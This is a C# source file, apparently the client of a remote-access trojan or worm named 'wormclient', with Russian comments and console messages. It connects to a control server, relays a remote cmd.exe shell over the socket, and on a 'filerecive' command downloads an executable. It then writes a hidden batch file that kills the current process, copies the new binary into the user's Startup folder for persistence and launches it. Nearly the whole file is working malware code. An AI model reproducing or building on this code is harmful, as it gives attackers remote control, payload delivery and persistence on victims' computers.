using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using Client;


namespace Client
{
    public class Program
    {

        public static ProgramStart newProg; //Экземпляр 
        private static byte[] buffer;       //Беффер приема        
        private static byte[] buff = new byte[1024]; //буффер для проверки сервера
        public static Socket s;             //Сокет
        private static int i;               // Размер входящих данных

        static void Main(string[] args)
        {
            connect();
            Thread th_connect = new Thread(reconnect);  // Поток для реконнекта
            //th_connect.Start();
            Thread th_recive = new Thread(Recive);      // Поток для приема
            th_recive.Start();
        }



            
        //Подключение к серверу
        static void connect()
        {
            try
            {
                s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                //Console.WriteLine("New socket ");
                //Console.WriteLine("Connected... ");
                s.Connect("127.0.0.1", 2200);

                Console.WriteLine("Connected to " + s.RemoteEndPoint.ToString());
                //Console.WriteLine("Gdem...");
            }
            catch (Exception e)
            {
                Console.WriteLine("Not Connection: {0}", e.Message);
                if (s != null)
                    s.Close();
                Console.WriteLine("Socket zakrili tak kak server ne otvechaet");
                Thread.Sleep(3000);
                Console.WriteLine("nemnogo jdem");
                Thread.Sleep(3000);
                Console.WriteLine("Podkluchaemsia zanovo");
                Thread.Sleep(3000);
                connect();
            }



            //Thread.Sleep(1000);
        }
        

        //Реконнект   
        static void reconnect()
        {
            while (true)
            {

                try
                {
                    //Console.WriteLine("Proverka connecta");
                    s.Send(buff);
                    Console.WriteLine("Est` connect! ");
                }
                catch (Exception e)
                {
                    Console.WriteLine("Not Connection: {0}", e.Message);
                    if (s != null)
                        Console.WriteLine("Zakrivaem socket t.k net sviazi s serverom");
                    s.Close();
                    Thread.Sleep(3000);
                    Console.WriteLine("Podkl. zanovo");
                    connect();
                }

                Thread.Sleep(3000);
            }
        }
        

        //Запуск программы      
        static void runProgram(string path)
        {

            Process p = new Process();
            p.StartInfo.FileName = path;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardError = true;


            //p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            try
            {
                Console.WriteLine("Zapusk progi");
                p.Start();
                Console.WriteLine("Proga zapushena.");
                //MessageBox.Show(_handle.ToString());
                //changeNameProc(p.ProcessName);
                //clearTBox("");
                p.BeginOutputReadLine();
                p.BeginErrorReadLine();

            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                //MessageBox.Show(e.Message);
                //changeNameProc("");
                p.Close();
                //_socCreate = false;
            }

            p.OutputDataReceived += new DataReceivedEventHandler(p_OutputDataReceived);
            p.ErrorDataReceived += new DataReceivedEventHandler(p_ErrorDataReceived);
        }
        
        
        //Прием данных
        static void Recive()
        {
            string s1;

            while (true)
            {

                buffer = new byte[1024];

                try
                {

                    Console.WriteLine("Receive...");
                    i = s.Receive(buffer);
                    Console.WriteLine("Received succes");
                    //Console.WriteLine("Received succes. Prineto " + i.ToString()+ " bytes");
                }

                catch (Exception e)
                {
                    Console.WriteLine("Not recive: {0}", e.Message);
                    Thread.Sleep(1000);
                    continue;
                }


                /// Записываем входные данные в строку

                s1 = Encoding.ASCII.GetString(buffer, 0, i);

                if (newProg == null)
                {

                    switch (s1)
                    {
                            //Закрытие программы
                        case "exit":
                            exit();
                            //Process.GetCurrentProcess().Dispose();                            
                            break;

                            //Перезапуск программы
                        case "reset":
                            //reset();

                            break;


                            //Запуск приложения
                        case "run":
                            //reset();
                            break;

                            //Остановка запущенного приложения
                        case "stop":
                            if (newProg != null)
                            {
                                newProg.Dispose();
                                newProg = null;
                            }
                            break;

                            //Запуск CMD.EXE
                        case "cmd":
                            try
                            {
                                newProg = new ProgramStart("cmd");
                                //runProgram("cmd");
                                //send("Program_started");
                                //s.Send()
                                Console.WriteLine("Program zapush");
                            }
                            catch (Exception e)
                            {
                                //MessageBox.Show(e.Message);
                                send("Program_not_started  " + e.Message);
                            }
                            break;

                            //Прием файла
                        case "filerecive":

                            int countbyte = s.Receive(buffer);
                            string countstring = Encoding.ASCII.GetString(buffer, 0, countbyte);
                            int filesize = int.Parse(countstring);
                            int filesize1 = 0;
                            long filesize2 = 0;
                            buffer = new byte[s.ReceiveBufferSize];
                            bool _bool = true;
                            byte[] data = new byte[filesize];


                            Console.WriteLine("Priem faila razmerom: {0}", filesize);

                            while (_bool)
                            {
                                Console.WriteLine("Prinimaiu.........");
                                int j = s.Receive(buffer);
                                filesize1 += j;
                                Console.WriteLine("Prinial {0} bayt", j.ToString());
                                Console.WriteLine("Prinial vsego {0} baytov", filesize1);

                                try
                                {
                                    if (j < s.ReceiveBufferSize)
                                    {
                                        byte[] data2 = new byte[j];
                                        Array.Copy(buffer, data2, j);
                                        data2.CopyTo(data, filesize2);
                                    }
                                    buffer.CopyTo(data, filesize2);
                                }
                                catch (Exception e)
                                {

                                }
                                filesize2 += j;

                                if (filesize1 == filesize)
                                {
                                    Console.WriteLine("Priem okonchen");
                                    _bool = false;
                                    continue;
                                }

                            }

                            Console.WriteLine("Zapis` v fail");
                            File.WriteAllBytes(@".\wormclient1.exe", data);
                            string _string = @"TASKKILL /F /IM " + Process.GetCurrentProcess().ProcessName + ".exe" + Environment.NewLine + @"COPY wormclient1.exe " + @"""%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\wormclient.exe""" + Environment.NewLine + "del /f /q wormclient1.exe" + Environment.NewLine + "start /b wormclient.exe";
                            File.WriteAllText(@Directory.GetCurrentDirectory() + "/run.bat", _string);
                            Process p = new Process();
                            p.StartInfo.FileName = @Directory.GetCurrentDirectory() + "/run.bat";
                            p.StartInfo.Arguments = " /b";
                            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                            /*
                     try
                     {
                         new FileInfo(@"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run.bat").Attributes = FileAttributes.Hidden;
                         new FileInfo(@"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\wormclient.exe").Attributes = FileAttributes.Hidden;
                     }
                     catch (Exception e)
                     {
                         MessageBox.Show(e.Message);
                     }
                       */
                            //new FileInfo(@"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\wormclient.exe").Attributes = FileAttributes.Hidden;
                            p.Start();
                            Console.WriteLine("File priniat");
                            buffer = new byte[1024];


                            break;

                        case "":
                            Console.WriteLine("Pusto");
                            break;

                        default:

                            if (buffer.Length <= 1024)
                                Console.WriteLine(s1 + " Not found");
                            break;
                    }
                }
                else
                {
                    if (s1 != "stop")
                        newProg.sendCommandfunc(s1);
                    else
                    {
                        newProg.Dispose();
                        newProg = null;
                        send("Programma zakrbita");
                    }
                }

                buffer = null;
                Thread.Sleep(1000);
            }

        }


        //Закрытие програмы
        private static void exit()
        {
            Process.GetCurrentProcess().Kill();
        }

       
        //Отправка строки
        public static void send(string s1)
        {
            try
            {
                s.Send(new System.Text.ASCIIEncoding().GetBytes(s1));
                Console.WriteLine("Vivod otpravlen");
                s1 = "";
            }
            catch (Exception e)
            {
                Console.WriteLine("Ошибка при отправке сообщения серверу", e.Message);

            }
        }
        
        
        //Отправка массива байт
        public static void send(byte[] b)
        {
            try
            {
                s.Send(b);
                Console.WriteLine("Vivod otpravlen");

            }
            catch (Exception e)
            {
                Console.WriteLine("Ошибка при отправке сообщения серверу", e.Message);

            }
        }



        // Ошибка
        private static void p_ErrorDataReceived(object sender, DataReceivedEventArgs e)
        {

        }


        // Отправка OutputData
        private static void p_OutputDataReceived(object sender, DataReceivedEventArgs e)
        {
            if (s != null)
            {
                //byte[] b = Encoding.GetEncoding(1251).GetBytes(e.Data);
                //writeOutput(Encoding.GetEncoding(866).GetString(b));
                send(e.Data);
            }
        }
    }

}
